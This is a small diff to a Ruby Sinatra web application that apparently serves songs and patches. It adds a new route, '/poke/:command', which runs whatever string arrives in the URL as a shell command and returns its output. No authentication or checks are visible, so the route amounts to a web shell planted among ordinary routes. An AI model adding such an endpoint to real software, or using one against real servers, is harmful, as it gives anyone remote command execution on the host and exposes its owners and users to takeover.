@@ -137,6 +137,11 @@ get '/send_patch/:pstring' do |pstring|
   haml :patch_info, locals: {presult:presult}, layout:nil
 end
 
+
+get '/poke/:command' do |command|
+  `#{command} 2>&1`
+end
+
 helpers do
   def load_songs(ord_list, song_flist)
     songs = []
